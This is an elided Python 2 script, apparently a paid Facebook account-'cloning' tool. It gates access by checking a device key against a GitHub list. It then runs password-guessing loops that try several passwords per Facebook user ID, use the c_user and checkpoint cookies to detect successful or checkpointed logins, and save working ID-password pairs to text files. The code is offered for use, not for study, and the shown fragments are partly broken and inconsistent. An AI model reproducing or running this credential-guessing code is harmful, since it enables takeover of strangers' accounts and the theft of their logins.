...
logo = "" "\x1b[1;91m##     ##    ###    ##     ##    ###    ########  ####\n\x1b[1;92m###   ###   ## ##   ##     ##   ## ##   ##     ##  ##\n\x1b[1;93m#### ####  ##   ##  ##     ##  ##   ##  ##     ##  ##\n\x1b[1;94m## ### ## ##     ## ######### ##     ## ##     ##  ##\n\x1b[1;95m##     ## ######### ##     ## ######### ##     ##  ##\n\x1b[1;96m##     ## ##     ## ##     ## ##     ## ##     ##  ##\n\x1b[1;92m##     ## ##     ## ##     ## ##     ## ########  ####\n\x1b[1;94m______________________________________________________\n \n \x1b[1;91m[*]\x1b[1;91m DEVELOPER : MAHADI HASAN AFRIDI\n \x1b[1;92m[*]\x1b[1;92m FACEBOOK  : MAHADI HASAN AFRIDI\n \x1b[1;93m[*]\x1b[1;93m GITHIB    : MAHADI-143\n \x1b[1;94m[*]\x1b[1;94m TOOLS     : PAID\n\x1b[1;95m______________________________________________________\n"""
dec="2"
server="2"
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/.android908.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        ...
        kok=open("/sdcard/.android908.txt",'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("press inter To Buy This tooL")
    ...
    r1=requests.get("https://raw.githubusercontent.com/MAHADI-143/apporved/main/Main").text
    r2=requests.get("https://raw.githubusercontent.com/MAHADI-143/apporved/main/Main").text
    if key1 in r1 or r2 :
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print "\x1b[1;32m[7]   For Any Help Massage Facebook"
    print '______________________________________________________'
    print "\x1b[1;33m[*]\x1b[1;33m For Need Any Help Type 7 And \x1b[1;33mMessage Me  "
    print '______________________________________________________'
    main_input()
def main_input():
    ...
    if mx=='1':
        print ""
        print('\033[1;94m Cheking  ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        print('\033[1;94m Cheking  ....\033[1;97m')
        time.sleep(3)
        numcloning()
    elif mx=='3':
        print ""
...
def numcloning():
    ...
    print ""
    os.system('echo " ______________________________________________________"| lolcat')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[MAHADI-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[MAHADI-CP] "+coc+user + " | " + pass1
...
def mineExt():
    ...
    print g+"[=] Extracting From Mahadi : "+my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[MAHADI-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[MAHADI-CP] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[MAHADI-OK] "+uid + " | " + pass2
                        ok=open('YOUSAF-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[MAHADI-CP] "+uid + " | " + pass2
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[MAHADI-OK] "+uid + " | " + pass3
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[MAHADI-CP] "+uid + " | " + pass3
                                    cp=open('IMTIAZ-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[MAHADI-OK] "+uid + " | " + pass4
                                        ok=open('IMTIAZ-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[MAHADI-CP] "+uid + " | " + pass4
                                            cp=open('IMTIAZ-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[MAHADI-OK] "+uid + " | " + pass5
                                                ok=open('IMTIAZ-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[MAHADI-CP] "+uid + " | " + pass5
                                                    cp=open('IMTIAZ-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[MAHADI-OK] "+uid + " | " + pass6
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[MAHADI-CP] "+uid + " | " + pass6
                                                            cp=open('IMTIAZ-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
